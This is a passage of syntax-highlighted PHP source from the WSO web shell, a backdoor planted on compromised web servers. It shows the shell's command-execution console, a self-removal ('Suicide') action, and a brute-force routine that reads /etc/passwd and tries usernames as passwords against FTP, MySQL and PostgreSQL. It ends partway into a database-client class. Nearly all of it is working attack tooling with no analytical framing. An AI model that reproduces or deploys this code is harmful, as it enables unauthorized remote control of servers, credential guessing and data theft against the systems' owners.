<span class="lineno"> 921</span>                                                         <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> <span class="p">{</span>
<span class="lineno"> 922</span>                                                             <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="s2">&quot;$ &quot;</span> <span class="o">.</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;</span>
<span class="lineno"> 923</span> <span class="s2">&quot;</span> <span class="o">.</span> <span class="nx">wsoEx</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]));</span>
<span class="lineno"> 924</span>                                                         <span class="p">}</span>
<span class="lineno"> 925</span>                                                         <span class="k">echo</span> <span class="s1">&#39;&lt;/textarea&gt;&lt;table style=&quot;border:1px solid #df5;background-color:#555;border-top:0px;&quot; cellpadding=0 cellspacing=0 width=&quot;100%&quot;&gt;&lt;tr&gt;&lt;td width=&quot;1%&quot;&gt;$&lt;/td&gt;&lt;td&gt;&lt;input type=text name=cmd style=&quot;border:0px;width:100%;&quot; onkeydown=&quot;kp(event);&quot;&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 926</span>                                                         <span class="k">echo</span> <span class="s1">&#39;&lt;/form&gt;&lt;/div&gt;&lt;script&gt;d.cf.cmd.focus();&lt;/script&gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 927</span>                                                         <span class="nx">wsoFooter</span><span class="p">();</span>
<span class="lineno"> 928</span>                                                     <span class="p">}</span>
<span class="lineno"> 929</span>                                                     <span class="k">function</span> <span class="nf">actionLogout</span><span class="p">()</span> <span class="p">{</span>
<span class="lineno"> 930</span>                                                         <span class="nb">session_destroy</span><span class="p">();</span>
<span class="lineno"> 931</span>                                                         <span class="k">die</span><span class="p">(</span><span class="s1">&#39;bye!&#39;</span><span class="p">);</span>
<span class="lineno"> 932</span>                                                     <span class="p">}</span>
<span class="lineno"> 933</span>                                                     <span class="k">function</span> <span class="nf">actionSelfRemove</span><span class="p">()</span> <span class="p">{</span>
<span class="lineno"> 934</span>                                                         <span class="k">if</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;yes&#39;</span><span class="p">)</span> <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">unlink</span><span class="p">(</span><span class="nb">preg_replace</span><span class="p">(</span><span class="s1">&#39;!\(\d+\)\s.*!&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;index.php&#39;</span><span class="p">)))</span> <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Shell has been removed&#39;</span><span class="p">);</span>
<span class="lineno"> 935</span>                                                         <span class="k">else</span> <span class="k">echo</span> <span class="s1">&#39;unlink error!&#39;</span><span class="p">;</span>
<span class="lineno"> 936</span>                                                         <span class="k">if</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39;yes&#39;</span><span class="p">)</span> <span class="nx">wsoHeader</span><span class="p">();</span>
<span class="lineno"> 937</span>                                                         <span class="k">echo</span> <span class="s1">&#39;&lt;h1&gt;Suicide&lt;/h1&gt;&lt;div class=content&gt;Really want to remove the shell?&lt;br&gt;&lt;a href=# onclick=&quot;g(null,null,\&#39;yes\&#39;)&quot;&gt;Yes&lt;/a&gt;&lt;/div&gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 938</span>                                                         <span class="nx">wsoFooter</span><span class="p">();</span>
<span class="lineno"> 939</span>                                                     <span class="p">}</span>
<span class="lineno"> 940</span>                                                     <span class="k">function</span> <span class="nf">actionBruteforce</span><span class="p">()</span> <span class="p">{</span>
<span class="lineno"> 941</span>                                                         <span class="nx">wsoHeader</span><span class="p">();</span>
<span class="lineno"> 942</span>                                                         <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;proto&#39;</span><span class="p">]))</span> <span class="p">{</span>
<span class="lineno"> 943</span>                                                             <span class="k">echo</span> <span class="s1">&#39;&lt;h1&gt;Results&lt;/h1&gt;&lt;div class=content&gt;&lt;span&gt;Type:&lt;/span&gt; &#39;</span> <span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;proto&#39;</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39; &lt;span&gt;Server:&lt;/span&gt; &#39;</span> <span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;server&#39;</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39;&lt;br&gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 944</span>                                                             <span class="k">if</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;proto&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;ftp&#39;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 945</span>                                                                 <span class="k">function</span> <span class="nf">bruteForce</span><span class="p">(</span><span class="nv">$ip</span><span class="p">,</span> <span class="nv">$port</span><span class="p">,</span> <span class="nv">$login</span><span class="p">,</span> <span class="nv">$pass</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 946</span>                                                                     <span class="nv">$fp</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ftp_connect</span><span class="p">(</span><span class="nv">$ip</span><span class="p">,</span> <span class="nv">$port</span> <span class="o">?</span> <span class="nv">$port</span> <span class="o">:</span> <span class="mi">21</span><span class="p">);</span>
<span class="lineno"> 947</span>                                                                     <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$fp</span><span class="p">)</span> <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
<span class="lineno"> 948</span>                                                                     <span class="nv">$res</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ftp_login</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="nv">$login</span><span class="p">,</span> <span class="nv">$pass</span><span class="p">);</span>
<span class="lineno"> 949</span>                                                                     <span class="o">@</span><span class="nb">ftp_close</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
<span class="lineno"> 950</span>                                                                     <span class="k">return</span> <span class="nv">$res</span><span class="p">;</span>
<span class="lineno"> 951</span>                                                                 <span class="p">}</span>
<span class="lineno"> 952</span>                                                             <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;proto&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;mysql&#39;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 953</span>                                                                 <span class="k">function</span> <span class="nf">bruteForce</span><span class="p">(</span><span class="nv">$ip</span><span class="p">,</span> <span class="nv">$port</span><span class="p">,</span> <span class="nv">$login</span><span class="p">,</span> <span class="nv">$pass</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 954</span>                                                                     <span class="nv">$res</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysql_connect</span><span class="p">(</span><span class="nv">$ip</span> <span class="o">.</span> <span class="s1">&#39;:&#39;</span> <span class="o">.</span> <span class="nv">$port</span> <span class="o">?</span> <span class="nv">$port</span> <span class="o">:</span> <span class="mi">3306</span><span class="p">,</span> <span class="nv">$login</span><span class="p">,</span> <span class="nv">$pass</span><span class="p">);</span>
<span class="lineno"> 955</span>                                                                     <span class="o">@</span><span class="nb">mysql_close</span><span class="p">(</span><span class="nv">$res</span><span class="p">);</span>
<span class="lineno"> 956</span>                                                                     <span class="k">return</span> <span class="nv">$res</span><span class="p">;</span>
<span class="lineno"> 957</span>                                                                 <span class="p">}</span>
<span class="lineno"> 958</span>                                                             <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;proto&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;pgsql&#39;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 959</span>                                                                 <span class="k">function</span> <span class="nf">bruteForce</span><span class="p">(</span><span class="nv">$ip</span><span class="p">,</span> <span class="nv">$port</span><span class="p">,</span> <span class="nv">$login</span><span class="p">,</span> <span class="nv">$pass</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 960</span>                                                                     <span class="nv">$str</span> <span class="o">=</span> <span class="s2">&quot;host=&#39;&quot;</span> <span class="o">.</span> <span class="nv">$ip</span> <span class="o">.</span> <span class="s2">&quot;&#39; port=&#39;&quot;</span> <span class="o">.</span> <span class="nv">$port</span> <span class="o">.</span> <span class="s2">&quot;&#39; user=&#39;&quot;</span> <span class="o">.</span> <span class="nv">$login</span> <span class="o">.</span> <span class="s2">&quot;&#39; password=&#39;&quot;</span> <span class="o">.</span> <span class="nv">$pass</span> <span class="o">.</span> <span class="s2">&quot;&#39; dbname=postgres&quot;</span><span class="p">;</span>
<span class="lineno"> 961</span>                                                                     <span class="nv">$res</span> <span class="o">=</span> <span class="o">@</span><span class="nb">pg_connect</span><span class="p">(</span><span class="nv">$str</span><span class="p">);</span>
<span class="lineno"> 962</span>                                                                     <span class="o">@</span><span class="nb">pg_close</span><span class="p">(</span><span class="nv">$res</span><span class="p">);</span>
<span class="lineno"> 963</span>                                                                     <span class="k">return</span> <span class="nv">$res</span><span class="p">;</span>
<span class="lineno"> 964</span>                                                                 <span class="p">}</span>
<span class="lineno"> 965</span>                                                             <span class="p">}</span>
<span class="lineno"> 966</span>                                                             <span class="nv">$success</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="lineno"> 967</span>                                                             <span class="nv">$attempts</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="lineno"> 968</span>                                                             <span class="nv">$server</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;server&#39;</span><span class="p">]);</span>
<span class="lineno"> 969</span>                                                             <span class="k">if</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 970</span>                                                                 <span class="nv">$temp</span> <span class="o">=</span> <span class="o">@</span><span class="nb">file</span><span class="p">(</span><span class="s1">&#39;/etc/passwd&#39;</span><span class="p">);</span>
<span class="lineno"> 971</span>                                                                 <span class="k">if</span> <span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$temp</span><span class="p">))</span> <span class="k">foreach</span> <span class="p">(</span><span class="nv">$temp</span> <span class="k">as</span> <span class="nv">$line</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 972</span>                                                                     <span class="nv">$line</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">,</span> <span class="nv">$line</span><span class="p">);</span>
<span class="lineno"> 973</span>                                                                     <span class="o">++</span><span class="nv">$attempts</span><span class="p">;</span>
<span class="lineno"> 974</span>                                                                     <span class="k">if</span> <span class="p">(</span><span class="nx">bruteForce</span><span class="p">(</span><span class="o">@</span><span class="nv">$server</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="o">@</span><span class="nv">$server</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$line</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="nv">$line</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span> <span class="p">{</span>
<span class="lineno"> 975</span>                                                                         <span class="nv">$success</span><span class="o">++</span><span class="p">;</span>
<span class="lineno"> 976</span>                                                                         <span class="k">echo</span> <span class="s1">&#39;&lt;b&gt;&#39;</span> <span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$line</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39;&lt;/b&gt;:&#39;</span> <span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$line</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39;&lt;br&gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 977</span>                                                                     <span class="p">}</span>
<span class="lineno"> 978</span>                                                                     <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;reverse&#39;</span><span class="p">])</span> <span class="p">{</span>
<span class="lineno"> 979</span>                                                                         <span class="nv">$tmp</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
<span class="lineno"> 980</span>                                                                         <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$line</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span><span class="nv">$i</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">;</span><span class="o">--</span><span class="nv">$i</span><span class="p">)</span> <span class="nv">$tmp</span><span class="o">.=</span> <span class="nv">$line</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="nv">$i</span><span class="p">];</span>
<span class="lineno"> 981</span>                                                                         <span class="o">++</span><span class="nv">$attempts</span><span class="p">;</span>
<span class="lineno"> 982</span>                                                                         <span class="k">if</span> <span class="p">(</span><span class="nx">bruteForce</span><span class="p">(</span><span class="o">@</span><span class="nv">$server</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="o">@</span><span class="nv">$server</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$line</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="nv">$tmp</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno"> 983</span>                                                                             <span class="nv">$success</span><span class="o">++</span><span class="p">;</span>
<span class="lineno"> 984</span>                                                                             <span class="k">echo</span> <span class="s1">&#39;&lt;b&gt;&#39;</span> <span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$line</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39;&lt;/b&gt;:&#39;</span> <span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">);</span>
<span class="lineno"> 985</span>                                                                         <span class="p">}</span>
<span class="lineno"> 986</span>                                                                     <span class="p">}</span>
<span class="lineno"> 987</span>                                                                 <span class="p">}</span>
<span class="lineno"> 988</span>                                                             <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 989</span>                                                                 <span class="nv">$temp</span> <span class="o">=</span> <span class="o">@</span><span class="nb">file</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;dict&#39;</span><span class="p">]);</span>
<span class="lineno"> 990</span>                                                                 <span class="k">if</span> <span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$temp</span><span class="p">))</span> <span class="k">foreach</span> <span class="p">(</span><span class="nv">$temp</span> <span class="k">as</span> <span class="nv">$line</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 991</span>                                                                     <span class="nv">$line</span> <span class="o">=</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$line</span><span class="p">);</span>
<span class="lineno"> 992</span>                                                                     <span class="o">++</span><span class="nv">$attempts</span><span class="p">;</span>
<span class="lineno"> 993</span>                                                                     <span class="k">if</span> <span class="p">(</span><span class="nx">bruteForce</span><span class="p">(</span><span class="nv">$server</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="o">@</span><span class="nv">$server</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;login&#39;</span><span class="p">],</span> <span class="nv">$line</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno"> 994</span>                                                                         <span class="nv">$success</span><span class="o">++</span><span class="p">;</span>
<span class="lineno"> 995</span>                                                                         <span class="k">echo</span> <span class="s1">&#39;&lt;b&gt;&#39;</span> <span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;login&#39;</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39;&lt;/b&gt;:&#39;</span> <span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$line</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;&lt;br&gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 996</span>                                                                     <span class="p">}</span>
<span class="lineno"> 997</span>                                                                 <span class="p">}</span>
<span class="lineno"> 998</span>                                                             <span class="p">}</span>
<span class="lineno"> 999</span>                                                             <span class="k">echo</span> <span class="s2">&quot;&lt;span&gt;Attempts:&lt;/span&gt; </span><span class="si">$attempts</span><span class="s2"> &lt;span&gt;Success:&lt;/span&gt; </span><span class="si">$success</span><span class="s2">&lt;/div&gt;&lt;br&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1000</span>                                                         <span class="p">}</span>
<span class="lineno">1001</span>                                                         <span class="k">echo</span> <span class="s1">&#39;&lt;h1&gt;FTP bruteforce&lt;/h1&gt;&lt;div class=content&gt;&lt;table&gt;&lt;form method=post&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;Type&lt;/span&gt;&lt;/td&gt;&#39;</span> <span class="o">.</span> <span class="s1">&#39;&lt;td&gt;&lt;select name=proto&gt;&lt;option value=ftp&gt;FTP&lt;/option&gt;&lt;option value=mysql&gt;MySql&lt;/option&gt;&lt;option value=pgsql&gt;PostgreSql&lt;/option&gt;&lt;/select&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&#39;</span> <span class="o">.</span> <span class="s1">&#39;&lt;input type=hidden name=c value=&quot;&#39;</span> <span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39;&quot;&gt;&#39;</span> <span class="o">.</span> <span class="s1">&#39;&lt;input type=hidden name=a value=&quot;&#39;</span> <span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39;&quot;&gt;&#39;</span> <span class="o">.</span> <span class="s1">&#39;&lt;input type=hidden name=charset value=&quot;&#39;</span> <span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39;&quot;&gt;&#39;</span> <span class="o">.</span> <span class="s1">&#39;&lt;span&gt;Server:port&lt;/span&gt;&lt;/td&gt;&#39;</span> <span class="o">.</span> <span class="s1">&#39;&lt;td&gt;&lt;input type=text name=server value=&quot;127.0.0.1&quot;&gt;&lt;/td&gt;&lt;/tr&gt;&#39;</span> <span class="o">.</span> <span class="s1">&#39;&lt;tr&gt;&lt;td&gt;&lt;span&gt;Brute type&lt;/span&gt;&lt;/td&gt;&#39;</span> <span class="o">.</span> <span class="s1">&#39;&lt;td&gt;&lt;label&gt;&lt;input type=radio name=type value=&quot;1&quot; checked&gt; /etc/passwd&lt;/label&gt;&lt;/td&gt;&lt;/tr&gt;&#39;</span> <span class="o">.</span> <span class="s1">&#39;&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;label style=&quot;padding-left:15px&quot;&gt;&lt;input type=checkbox name=reverse value=1 checked&gt; reverse (login -&gt; nigol)&lt;/label&gt;&lt;/td&gt;&lt;/tr&gt;&#39;</span> <span class="o">.</span> <span class="s1">&#39;&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;label&gt;&lt;input type=radio name=type value=&quot;2&quot;&gt; Dictionary&lt;/label&gt;&lt;/td&gt;&lt;/tr&gt;&#39;</span> <span class="o">.</span> <span class="s1">&#39;&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;table style=&quot;padding-left:15px&quot;&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;Login&lt;/span&gt;&lt;/td&gt;&#39;</span> <span class="o">.</span> <span class="s1">&#39;&lt;td&gt;&lt;input type=text name=login value=&quot;root&quot;&gt;&lt;/td&gt;&lt;/tr&gt;&#39;</span> <span class="o">.</span> <span class="s1">&#39;&lt;tr&gt;&lt;td&gt;&lt;span&gt;Dictionary&lt;/span&gt;&lt;/td&gt;&#39;</span> <span class="o">.</span> <span class="s1">&#39;&lt;td&gt;&lt;input type=text name=dict value=&quot;&#39;</span> <span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39;passwd.dic&quot;&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&#39;</span> <span class="o">.</span> <span class="s1">&#39;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=submit value=&quot;&gt;&gt;&quot;&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt;&lt;/table&gt;&#39;</span><span class="p">;</span>
<span class="lineno">1002</span>                                                         <span class="k">echo</span> <span class="s1">&#39;&lt;/div&gt;&lt;br&gt;&#39;</span><span class="p">;</span>
<span class="lineno">1003</span>                                                         <span class="nx">wsoFooter</span><span class="p">();</span>
<span class="lineno">1004</span>                                                     <span class="p">}</span>
<span class="lineno">1005</span>                                                     <span class="k">function</span> <span class="nf">actionSql</span><span class="p">()</span> <span class="p">{</span>
<span class="lineno">1006</span>                                                         <span class="k">class</span> <span class="nc">DbClass</span> <span class="p">{</span>
<span class="lineno">1007</span>                                                             <span class="k">var</span> <span class="nv">$type</span><span class="p">;</span>
<span class="lineno">1008</span>                                                             <span class="k">var</span> <span class="nv">$link</span><span class="p">;</span>
<span class="lineno">1009</span>                                                             <span class="k">var</span> <span class="nv">$res</span><span class="p">;</span>
<span class="lineno">1010</span>                                                             <span class="k">function</span> <span class="nf">DbClass</span><span class="p">(</span><span class="nv">$type</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1011</span>                                                                 <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">type</span> <span class="o">=</span> <span class="nv">$type</span><span class="p">;</span>
<span class="lineno">1012</span>                                                             <span class="p">}</span>
<span class="lineno">1013</span>                                                             <span class="k">function</span> <span class="nf">connect</span><span class="p">(</span><span class="nv">$host</span><span class="p">,</span> <span class="nv">$user</span><span class="p">,</span> <span class="nv">$pass</span><span class="p">,</span> <span class="nv">$dbname</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1014</span>                                                                 <span class="k">switch</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">type</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1015</span>                                                                     <span class="k">case</span> <span class="s1">&#39;mysql&#39;</span><span class="o">:</span>
<span class="lineno">1016</span>                                                                         <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">link</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysql_connect</span><span class="p">(</span><span class="nv">$host</span><span class="p">,</span> <span class="nv">$user</span><span class="p">,</span> <span class="nv">$pass</span><span class="p">,</span> <span class="k">true</span><span class="p">))</span> <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
<span class="lineno">1017</span>                                                                         <span class="k">break</span><span class="p">;</span>
<span class="lineno">1018</span>                                                                     <span class="k">case</span> <span class="s1">&#39;pgsql&#39;</span><span class="o">:</span>
<span class="lineno">1019</span>                                                                         <span class="nv">$host</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">,</span> <span class="nv">$host</span><span class="p">);</span>
<span class="lineno">1020</span>                                                                         <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$host</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="nv">$host</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">5432</span><span class="p">;</span>
<span class="lineno">1021</span>                                                                         <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">link</span> <span class="o">=</span> <span class="o">@</span><span class="nb">pg_connect</span><span class="p">(</span><span class="s2">&quot;host=</span><span class="si">{</span><span class="nv">$host</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s2"> port=</span><span class="si">{</span><span class="nv">$host</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="si">}</span><span class="s2"> user=</span><span class="si">$user</span><span class="s2"> password=</span><span class="si">$pass</span><span class="s2"> dbname=</span><span class="si">$dbname</span><span class="s2">&quot;</span><span class="p">))</span> <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
<span class="lineno">1022</span>                                                                         <span class="k">break</span><span class="p">;</span>
<span class="lineno">1023</span>                                                                     <span class="p">}</span>
<span class="lineno">1024</span>                                                                     <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
<span class="lineno">1025</span>                                                                 <span class="p">}</span>
<span class="lineno">1026</span>                                                                 <span class="k">function</span> <span class="nf">selectdb</span><span class="p">(</span><span class="nv">$db</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1027</span>                                                                     <span class="k">switch</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">type</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1028</span>                                                                         <span class="k">case</span> <span class="s1">&#39;mysql&#39;</span><span class="o">:</span>
<span class="lineno">1029</span>                                                                             <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">mysql_select_db</span><span class="p">(</span><span class="nv">$db</span><span class="p">))</span> <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
<span class="lineno">1030</span>                                                                             <span class="k">break</span><span class="p">;</span>
<span class="lineno">1031</span>                                                                         <span class="p">}</span>
<span class="lineno">1032</span>                                                                         <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
<span class="lineno">1033</span>                                                                 <span class="p">}</span>
<span class="lineno">1034</span>                                                                 <span class="k">function</span> <span class="nf">query</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1035</span>                                                                     <span class="k">switch</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">type</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1036</span>                                                                         <span class="k">case</span> <span class="s1">&#39;mysql&#39;</span><span class="o">:</span>
<span class="lineno">1037</span>                                                                             <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">res</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$str</span><span class="p">);</span>
<span class="lineno">1038</span>                                                                         <span class="k">break</span><span class="p">;</span>
<span class="lineno">1039</span>                                                                         <span class="k">case</span> <span class="s1">&#39;pgsql&#39;</span><span class="o">:</span>
<span class="lineno">1040</span>                                                                             <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">res</span> <span class="o">=</span> <span class="o">@</span><span class="nb">pg_query</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">link</span><span class="p">,</span> <span class="nv">$str</span><span class="p">);</span>
<span class="lineno">1041</span>                                                                         <span class="k">break</span><span class="p">;</span>
<span class="lineno">1042</span>                                                                     <span class="p">}</span>
<span class="lineno">1043</span>                                                                     <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
<span class="lineno">1044</span>                                                                 <span class="p">}</span>
<span class="lineno">1045</span>                                                                 <span class="k">function</span> <span class="nf">fetch</span><span class="p">()</span> <span class="p">{</span>
<span class="lineno">1046</span>                                                                     <span class="nv">$res</span> <span class="o">=</span> <span class="nb">func_num_args</span><span class="p">()</span> <span class="o">?</span> <span class="nb">func_get_arg</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">:</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">res</span><span class="p">;</span>
<span class="lineno">1047</span>                                                                     <span class="k">switch</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">type</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1048</span>                                                                         <span class="k">case</span> <span class="s1">&#39;mysql&#39;</span><span class="o">:</span>
<span class="lineno">1049</span>                                                                             <span class="k">return</span> <span class="o">@</span><span class="nb">mysql_fetch_assoc</span><span class="p">(</span><span class="nv">$res</span><span class="p">);</span>
<span class="lineno">1050</span>                                                                         <span class="k">break</span><span class="p">;</span>
